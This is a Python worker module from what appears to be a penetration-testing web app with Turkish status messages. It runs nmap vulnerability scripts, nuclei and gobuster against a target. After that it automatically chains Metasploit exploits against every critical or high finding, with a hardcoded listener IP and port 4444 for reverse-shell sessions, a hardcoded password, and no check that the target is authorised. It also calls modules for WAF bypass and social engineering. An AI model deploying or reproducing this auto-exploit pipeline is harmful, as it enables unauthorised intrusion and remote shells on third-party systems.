
import time
import logging
import gc
import subprocess
import os
import tempfile
import shutil
from urllib.parse import urlparse
from cyberapp.models.db import db_conn
from cyberapp.services.logger import get_logger
from cyberapp.services.progress import update_scan_progress

# For testability: allow patching AutoExploitEngine in tests
try:
    from cybermodules.autoexploit import AutoExploitEngine as _RealAutoExploitEngine
except ImportError:
    _RealAutoExploitEngine = None
AutoExploitEngine = _RealAutoExploitEngine

logger = get_logger("monolith.worker")

# Global tool availability cache
_TOOLS_CACHE = {}


def _check_tool_availability(tool_name, paths=None):
    """Check if a tool is available in the system"""
    if tool_name in _TOOLS_CACHE:
        return _TOOLS_CACHE[tool_name]
    
    if paths is None:
        paths = [
            f'/usr/bin/{tool_name}',
            f'/usr/local/bin/{tool_name}',
            f'/opt/homebrew/bin/{tool_name}',
            tool_name  # Just the name, rely on PATH
        ]
    
    for path in paths:
        # Handle paths with spaces (like "/path/to/tool name")
        actual_path = path.split()[0] if ' ' in path else path
        if os.path.isfile(actual_path) and os.access(actual_path, os.X_OK):
            _TOOLS_CACHE[tool_name] = path
            return path
        elif shutil.which(tool_name):
            _TOOLS_CACHE[tool_name] = tool_name
            return tool_name
    
    _TOOLS_CACHE[tool_name] = None
    return None


def _run_tool_direct(tool_name, cmd, timeout=600):
    """Run a tool directly and return output"""
    fd, out = tempfile.mkstemp(prefix=f'{tool_name}_', suffix='.txt')
    os.close(fd)
    
    try:
        result = subprocess.run(
            cmd,
            stdout=open(out, 'w'),
            stderr=subprocess.STDOUT,
            timeout=timeout,
            shell=False  # Don't use shell to avoid injection
        )
        
        with open(out, 'r') as f:
            return out, f.read()
    except subprocess.TimeoutExpired:
        with open(out, 'a') as f:
            f.write('\n[ERROR] Timeout')
        return out, ""
    except Exception as e:
        with open(out, 'a') as f:
            f.write(f'\n[ERROR] {str(e)}')
        return out, ""
    finally:
        try:
            os.unlink(out)
        except Exception:
            pass


def _log_tool_output(scan_id, tool_name, output):
    """Log tool output to database"""
    try:
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (scan_id, tool_name, output[:5000] if output else "No output"),
            )
            conn.commit()
    except Exception:
        pass


def _parse_nmap_output(output, scan_id):
    """Parse Nmap output for open ports and services"""
    if not output:
        return
    
    # Parse open ports
    for line in output.split('\n'):
        line = line.strip()
        if 'open' in line and 'tcp' in line:
            try:
                with db_conn() as conn:
                    conn.execute(
                        "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                        (scan_id, "NMAP_PORT", f"Open port: {line}"),
                    )
                    conn.commit()
            except Exception:
                pass
        
        # Detect services
        if 'tcpwrapped' in line:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (scan_id, "NMAP_INFO", f"TCP Wrapped: {line}"),
                )
                conn.commit()


def _parse_nuclei_output(output, scan_id):
    """Parse Nuclei output for vulnerabilities"""
    if not output:
        return
    
    critical_count = output.count('[critical]')
    high_count = output.count('[high]')
    medium_count = output.count('[medium]')
    
    # Log summary
    try:
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                (scan_id, "NUCLEI_SUMMARY", f"Critical: {critical_count}, High: {high_count}, Medium: {medium_count}"),
            )
            conn.commit()
    except Exception:
        pass
    
    # Parse individual findings
    import re
    # Pattern to match nuclei output format
    patterns = [
        r'\[([^\]]+)\]\s+(https?://[^\s]+)',  # [critical] https://example.com/path
        r'(https?://[^\s]+)\s+\[([^\]]+)\]',  # https://example.com [critical]
    ]
    
    for pattern in patterns:
        for match in re.finditer(pattern, output):
            if pattern == r'\[([^\]]+)\]\s+(https?://[^\s]+)':
                severity, url = match.groups()
            else:
                url, severity = match.groups()
            
            severity = severity.upper().strip()
            url = url.strip()
            
            # Map nuclei severity to our severity
            if severity in ['CRITICAL', 'CRIT']:
                our_severity = 'CRITICAL'
            elif severity in ['HIGH']:
                our_severity = 'HIGH'
            elif severity in ['MEDIUM']:
                our_severity = 'MEDIUM'
            else:
                our_severity = 'MEDIUM'
            
            try:
                with db_conn() as conn:
                    conn.execute(
                        "INSERT INTO vulns (scan_id, type, url, fix, severity) VALUES (?, ?, ?, ?, ?)",
                        (scan_id, f"NUCLEI_{severity}", url, "", our_severity),
                    )
                    conn.commit()
            except Exception:
                pass


def _parse_gobuster_output(output, scan_id):
    """Parse Gobuster output for found directories"""
    if not output:
        return
    
    found_count = 0
    for line in output.split('\n'):
        line = line.strip()
        # Common gobuster formats
        if ('Status:' in line or 'Found:' in line) and ('200' in line or '301' in line or '302' in line):
            found_count += 1
            try:
                with db_conn() as conn:
                    conn.execute(
                        "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                        (scan_id, "GOBUSTER_FOUND", line),
                    )
                    conn.commit()
            except Exception:
                pass
    
    if found_count > 0:
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (scan_id, "GOBUSTER_SUMMARY", f"Found {found_count} accessible paths"),
                )
                conn.commit()
        except Exception:
            pass


def run_worker(target, scan_id, run_python, selected_tools, user_id="anonymous"):
    """Main worker function that runs all scans"""
    try:
        start_time = time.time()
        update_scan_progress(scan_id, 5, _eta(start_time, 5))

        with db_conn() as conn:
            conn.execute(
                "UPDATE scans SET status = 'GHOST ENGINE 🕵️', user_id = ? WHERE id = ?",
                (user_id, scan_id),
            )
            conn.commit()

        # === GHOST ENGINE (Python-based scanner) ===
        if run_python:
            try:
                from cybermodules.social_engineering import GhostEngine
                ghost = GhostEngine(target, scan_id)
                ghost.start()
                update_scan_progress(scan_id, 25, _eta(start_time, 25))
            except Exception as e:
                _log_tool_output(scan_id, "GHOST_ENGINE", f"Error: {str(e)[:200]}")
                logger.error(f"GhostEngine error: {e}", exc_info=True)

        # === DIRECT TOOL EXECUTION (without Celery) ===
        if selected_tools:
            with db_conn() as conn:
                conn.execute("UPDATE scans SET status = 'ARSENAL ⚔️' WHERE id = ?", (scan_id,))
                conn.commit()

            # Nmap
            if "nmap" in selected_tools:
                try:
                    nmap_path = _check_tool_availability("nmap", ['nmap', '/usr/bin/nmap', '/usr/local/bin/nmap'])
                    if nmap_path:
                        _log_tool_output(scan_id, "NMAP", f"Starting Nmap scan: {nmap_path}")
                        out_file, output = _run_tool_direct(
                            "nmap",
                            [nmap_path, "-sV", "-sC", "-O", "-T4", "--script", "vuln", target],
                            timeout=300
                        )
                        _log_tool_output(scan_id, "NMAP", output[:10000] if output else "No output")
                        _parse_nmap_output(output, scan_id)
                        _log_tool_output(scan_id, "NMAP", "Nmap scan completed")
                    else:
                        _log_tool_output(scan_id, "NMAP", "Nmap not found - skipping port scan")
                        logger.warning("Nmap not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "NMAP_ERROR", str(e)[:200])
                    logger.error(f"Nmap error: {e}", exc_info=True)

            # Nuclei
            if "nuclei" in selected_tools:
                try:
                    nuclei_path = _check_tool_availability("nuclei", ['nuclei', '/usr/bin/nuclei', '/usr/local/bin/nuclei'])
                    if nuclei_path:
                        _log_tool_output(scan_id, "NUCLEI", "Starting Nuclei vulnerability scan")
                        out_file, output = _run_tool_direct(
                            "nuclei",
                            [nuclei_path, "-u", target, "-severity", "critical,high,medium", "-c", "50"],
                            timeout=600
                        )
                        _log_tool_output(scan_id, "NUCLEI", output[:10000] if output else "No output")
                        _parse_nuclei_output(output, scan_id)
                        _log_tool_output(scan_id, "NUCLEI", "Nuclei scan completed")
                    else:
                        _log_tool_output(scan_id, "NUCLEI", "Nuclei not found - skipping vulnerability scan")
                        logger.warning("Nuclei not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "NUCLEI_ERROR", str(e)[:200])
                    logger.error(f"Nuclei error: {e}", exc_info=True)

            # Gobuster
            if "gobuster" in selected_tools:
                try:
                    gobuster_path = _check_tool_availability("gobuster", ['gobuster', '/usr/bin/gobuster', '/usr/local/bin/gobuster'])
                    if gobuster_path:
                        # Find wordlist
                        wordlist = "/usr/share/wordlists/dirb/common.txt"
                        if os.path.exists("/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt"):
                            wordlist = "/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt"
                        
                        _log_tool_output(scan_id, "GOBUSTER", "Starting directory brute-force scan")
                        out_file, output = _run_tool_direct(
                            "gobuster",
                            [gobuster_path, "dir", "-u", target, "-w", wordlist, "-x", "php,html,aspx,jsp,js,txt,xml", "-t", "50"],
                            timeout=600
                        )
                        _log_tool_output(scan_id, "GOBUSTER", output[:10000] if output else "No output")
                        _parse_gobuster_output(output, scan_id)
                        _log_tool_output(scan_id, "GOBUSTER", "Gobuster scan completed")
                    else:
                        _log_tool_output(scan_id, "GOBUSTER", "Gobuster not found - skipping directory scan")
                        logger.warning("Gobuster not found in system")
                except Exception as e:
                    _log_tool_output(scan_id, "GOBUSTER_ERROR", str(e)[:200])
                    logger.error(f"Gobuster error: {e}", exc_info=True)

            # Run SupremeArsenalEngine for other tools
            try:
                from cybermodules.arsenal import SupremeArsenalEngine
                arsenal = SupremeArsenalEngine(target, scan_id, selected_tools)
                arsenal.start()
            except ImportError:
                _log_tool_output(scan_id, "ARSENAL", "SupremeArsenalEngine not available")
            except Exception as e:
                _log_tool_output(scan_id, "ARSENAL", f"Error: {str(e)[:200]}")
                logger.error(f"Arsenal error: {e}", exc_info=True)

            update_scan_progress(scan_id, 60, _eta(start_time, 60))

            # Additional tools
            if "ad_enum" in selected_tools:
                try:
                    from cybermodules.ad_enum import ActiveDirectoryEnum
                    ad = ActiveDirectoryEnum(target.replace("http://", "").replace("https://", ""), scan_id)
                    ad.start()
                except ImportError:
                    _log_tool_output(scan_id, "AD_ENUM", "ActiveDirectoryEnum not available")
                except Exception as e:
                    _log_tool_output(scan_id, "AD_ENUM", f"Error: {str(e)[:200]}")

            if "waf_bypass" in selected_tools:
                try:
                    from cybermodules.waf_bypass import WAFBypassEngine
                    waf = WAFBypassEngine(target, scan_id)
                    waf.start()
                except ImportError:
                    _log_tool_output(scan_id, "WAF_BYPASS", "WAFBypassEngine not available")
                except Exception as e:
                    _log_tool_output(scan_id, "WAF_BYPASS", f"Error: {str(e)[:200]}")

            if "llm_analysis" in selected_tools:
                try:
                    from cybermodules.llm_engine import LLMEngine
                    llm = LLMEngine(scan_id)
                    with db_conn() as conn:
                        vulns = conn.execute(
                            "SELECT type, url FROM vulns WHERE scan_id=?", (scan_id,)
                        ).fetchall()
                        for v in vulns:
                            try:
                                analysis = llm.analyze_vuln(v[0], v[1])
                                with db_conn() as conn2:
                                    conn2.execute(
                                        "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                                        (scan_id, "LLM_ANALIZ", analysis),
                                    )
                                    conn2.commit()
                            except Exception as llm_err:
                                _log_tool_output(scan_id, "LLM_ANALYZER", f"Analysis error: {str(llm_err)[:100]}")
                except ImportError:
                    _log_tool_output(scan_id, "LLM_ANALYSIS", "LLMEngine not available")
                except Exception as e:
                    _log_tool_output(scan_id, "LLM_ANALYSIS", f"Error: {str(e)[:100]}")

        update_scan_progress(scan_id, 80, _eta(start_time, 80))

        execution_time = time.time() - start_time

        with db_conn() as conn:
            critical_vulns = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'COMMAND_INJECTION', 'CRITICAL')",
                (scan_id,),
            ).fetchone()[0]

            if critical_vulns > 0:
                conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅ 🔴 AÇIK VAR' WHERE id = ?", (scan_id,))
            else:
                conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅' WHERE id = ?", (scan_id,))

            conn.execute(
                "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                (scan_id, "EXECUTION_TIME", f"Total execution: {execution_time:.2f} seconds"),
            )
            conn.commit()

        update_scan_progress(scan_id, 100, 0)

        if "gamification" in selected_tools:
            try:
                from cybermodules.gamification import GamificationEngine
                game = GamificationEngine(scan_id, user_id)
                game.calculate_score()
            except ImportError:
                pass
            except Exception as e:
                _log_tool_output(scan_id, "GAMIFICATION", f"Error: {str(e)[:100]}")

        # === METASPLOIT EXPLOIT CHAINING ===
        try:
            from cybermodules.autoexploit import AutoExploitEngine
            logging.info("[AUTO EXPLOIT] Kritik zafiyet kontrolü ve otomatik exploit başlatılıyor...")

            LHOST = "192.168.1.100"  # Kendi IP'nizi buraya yazın

            engine = AutoExploitEngine(password='rascal123')

            with db_conn() as conn:
                critical_rows = conn.execute(
                    """
                    SELECT type, url
                    FROM vulns
                    WHERE scan_id = ?
                      AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'COMMAND_INJECTION', 'CRITICAL', 'HIGH')
                    """,
                    (scan_id,),
                ).fetchall()

            if critical_rows:
                findings = []
                for row in critical_rows:
                    vuln_type = row[0]
                    vuln_url = row[1] or ""
                    parsed = urlparse(vuln_url) if vuln_url else None
                    host = ""
                    port = None
                    if parsed and parsed.netloc:
                        host = parsed.hostname or ""
                        port = parsed.port
                    if not host:
                        host = target.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0]
                    if not port:
                        port = 445 if "smb" in str(vuln_type).lower() else 80

                    finding = {
                        'ip': host,
                        'port': port,
                        'cve': None,
                        'name': vuln_type,
                        'service': vuln_type.lower().replace('_', ' ')
                    }
                    findings.append(finding)

                if findings:
                    logging.info(f"[AUTO EXPLOIT] {len(findings)} kritik zafiyet için exploit denenecek.")
                    exploit_results = engine.auto_chain_from_findings(findings=findings, lhost=LHOST, lport=4444)

                    success_count = 0
                    for res in exploit_results:
                        if res.get('status') == 'success':
                            success_count += 1
                            session_id = res.get('session_id')
                            module = res.get('exploit_module', 'Bilinmiyor')
                            logging.info(f"[+] SESSION AÇILDI! ID: {session_id} | Module: {module}")

                            with db_conn() as conn:
                                conn.execute(
                                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                                    (scan_id, "EXPLOIT_SUCCESS", f"Session {session_id} → {module}"),
                                )
                                conn.commit()
                    
                    if success_count > 0:
                        with db_conn() as conn:
                            conn.execute("UPDATE scans SET status = 'TAMAMLANDI ✅ 🔴 SESSION AÇILDI' WHERE id = ?", (scan_id,))
                            conn.commit()

        except ImportError:
            _log_tool_output(scan_id, "AUTOEXPLOIT", "AutoExploitEngine not available")
        except Exception as auto_e:
            logging.error(f"[AUTO EXPLOIT HATA] {str(auto_e)}", exc_info=True)
            _log_tool_output(scan_id, "AUTOEXPLOIT_AUTO", f"Error: {str(auto_e)[:150]}")

    except Exception as e:
        logger.error(f"Worker error: {e}", exc_info=True)
        with db_conn() as conn:
            conn.execute("UPDATE scans SET status = 'HATA ❌' WHERE id = ?", (scan_id,))
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (scan_id, "SYSTEM_ERROR", f"Worker error: {str(e)[:200]}"),
            )
            conn.commit()
        update_scan_progress(scan_id, 100, 0)

    finally:
        try:
            gc.collect()
        except Exception:
            pass


def _eta(start_time, progress):
    if progress <= 0:
        return None
    elapsed = time.time() - start_time
    remaining = max(0, 100 - progress)
    return int((elapsed / max(progress, 1)) * remaining)
